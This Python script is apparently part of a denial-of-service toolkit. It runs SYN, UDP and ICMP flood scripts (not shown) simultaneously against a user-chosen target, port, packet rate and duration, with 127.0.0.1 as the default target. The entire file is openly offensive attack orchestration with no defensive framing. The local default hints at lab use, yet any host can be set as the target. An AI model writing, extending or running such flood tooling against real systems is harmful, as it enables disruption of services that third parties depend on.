#!/usr/bin/env python3
"""Multi-vector attack orchestrator — spawns SYN + UDP + ICMP simultaneously."""
import argparse
import subprocess
import signal
import sys
import os


_children: list[subprocess.Popen] = []


def _stop(sig, frame):
    for proc in _children:
        if proc.poll() is None:
            proc.terminate()
    sys.exit(0)


def parse_args():
    p = argparse.ArgumentParser()
    p.add_argument("--target",   default="127.0.0.1")
    p.add_argument("--port",     type=int, default=80)
    p.add_argument("--rate",     type=int, default=300, help="pps per vector")
    p.add_argument("--duration", type=int, default=30)
    return p.parse_args()


def main():
    signal.signal(signal.SIGINT,  _stop)
    signal.signal(signal.SIGTERM, _stop)

    args = parse_args()
    base_dir = os.path.dirname(os.path.abspath(__file__))
    common   = ["--target", args.target, "--rate", str(args.rate), "--duration", str(args.duration)]

    scripts = ["syn_flood.py", "udp_flood.py", "icmp_flood.py"]
    for script in scripts:
        path = os.path.join(base_dir, script)
        proc = subprocess.Popen([sys.executable, path] + common)
        _children.append(proc)
        print(f"[MIXED] spawned {script}  pid={proc.pid}")

    for proc in _children:
        proc.wait()

    print("[MIXED] all vectors done")


if __name__ == "__main__":
    main()
